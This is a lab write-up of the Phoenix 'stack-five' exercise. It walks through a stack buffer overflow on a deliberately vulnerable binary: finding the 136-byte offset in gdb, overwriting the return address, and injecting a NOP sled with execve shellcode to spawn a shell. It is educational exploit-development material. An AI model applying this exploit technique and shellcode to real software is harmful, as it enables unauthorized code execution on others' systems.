<h3 style="text-align:center" dir="rtl">بسم الله الرحمن الرحيم </h3>

# Stack Four :
In this level we need to execute a shellcode to do that we need to overflow the buffer and overwite the return address of `start_level` function to a region in memory we have control of like the stack.We will use a linux/x86-64 [shellcode](https://shell-storm.org/shellcode/files/shellcode-806.html) because I'm working in `amd64` folder in the virtual machine.
<br>
First we need to find how many bytes we need to reach the return address in the stack. Run gdb with the binary `stack-five` and set the breakpoint at the end of the `start_level` function disassembly.
```bash
gdb stack-five
(gdb) disas start_level

Dump of assembler code for function start_level:
   0x000000000040058d <+0>:	push   rbp
   0x000000000040058e <+1>:	mov    rbp,rsp
   0x0000000000400591 <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:	lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:	mov    rdi,rax
   0x000000000040059c <+15>:	call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:	nop
   0x00000000004005a2 <+21>:	leave  
   0x00000000004005a3 <+22>:	ret    
End of assembler dump.

(gdb) b *start_level+22

Breakpoint 1 at 0x4005a3
```
Now we can generate a pattern to use it as input to the buffer. Go to [zerosum0x0 blog](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html) to generate the string and copy the result. Run the program from gdb:
```bash
(gdb) run

Starting program: /opt/phoenix/amd64/stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Breakpoint 1, 0x00000000004005a3 in start_level ()
```
Examin the stack
```bash
(gdb) x/8wx $rsp
0x7fffffffe518:	0x65413565	0x37654136	0x41386541	0x66413965
0x7fffffffe528:	0x31664130	0x41326641	0x66413366	0x35664134
```
We can use python to get the ascii from hex value `0x65413565`
```python
import struct
string = struct.pack('I', 0x65413565)
print(string.decode('ascii'))
```
```bash
python3 -c "import struct;string = struct.pack('I', 0x65413565);print(string.decode('ascii'))"

e5Ae
```
Copy `e5Ae` and go to pattern generator and use it to find the offset. The offset is 136 bytes from the start of `buffer` to the return address in the stack.Lets redirect the program flow to the stack after the return address. The return address at `0x7fffffffe518` and we will jump to `0x7fffffffe520` because the return address is 8-bytes.Put a breakpoint instruction `0xcc` after the jump to see if it works fine.
```bash
python3 -c "import struct ; print((b'A'*136 )+ (struct.pack('L', 0x7fffffffe520)) + b'\xcc\xcc\xcc\xcc' )"

b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \xe5\xff\xff\xff\x7f\x00\x00\xcc\xcc\xcc\xcc'
```
Create a text file and echo the string to the new text file using `echo -e`. The `-e` options is used to enable interpretation of backslash escapes.
```bash
cat > data.txt
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \xe5\xff\xff\xff\x7f\x00\x00\xcc\xcc\xcc\xcc" > data.txt 


```
Now delete the breakpoints in gdb and run the program using `data.txt` as input and see if we get a breakpoint `SIGTRAP` :
```bash
(gdb) d breakpoints
(gdb) run < data.txt

Starting program: /opt/phoenix/amd64/stack-five < data.txt
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Program received signal SIGTRAP, Trace/breakpoint trap.
0x00007fffffffe521 in ?? ()
```
Now append the shellcode to the string in `data.txt` and replace the INT3 `0xcc` instruction to NOP `0x90`:
```python
import struct
padding = b'A'*136 
return_add = struct.pack('L', 0x7fffffffe520) 
nop =  b'\x90\x90\x90\x90'
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

print(padding + return_add + nop + shellcode)
```
Run the script, copy the result, echo it to `data.txt` and run the program:
```bash
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \xe5\xff\xff\xff\x7f\x00\x00\x90\x90\x90\x901\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05" > data.txt
gdb stack-five
(gdb) run < data.txt
tarting program: /opt/phoenix/amd64/stack-five < data.txt
Welcome to phoenix/stack-five, brought to you by https://exploit.education
process 494 is executing new program: /bin/dash
[Inferior 1 (process 494) exited normally]
```
Yarbi lak al7md, the program executes the shellcode and run `/bin/dash` - its a replacement of `bash` in Ubuntu/Debian for its small size and speed- successfully.The reason that the shell is not interactive because every shell needs input from standard input but we redirect the `stack-five` standard ouput to the shell standard input and when `stack-five` terminates it closed that pipe.A trick to use is the `cat` command to relay input to the shell.
```bash
(python exploit.py ; cat) | ./stack-five

Welcome to phoenix/stack-five, brought to you by https://exploit.education
ls
data.txt  exploit.py  final-two   format-four  format-three  format-zero  heap-three  heap-zero  net-two   stack-five  stack-one  stack-three  stack-zero

who
user     pts/0        Dec 20 05:50 (10.0.2.2)

whoami  
phoenix-amd64-stack-five
```

### It Does Not Work Outside of GDB??!!
I don't know why but sometimes it does not work outside GDB resulting in segmentation fault to work around this issue I tried deeper stack address and more `NOP` sliding. `exploit.py` has the stack address and `NOP` that work fine in virtual machine.
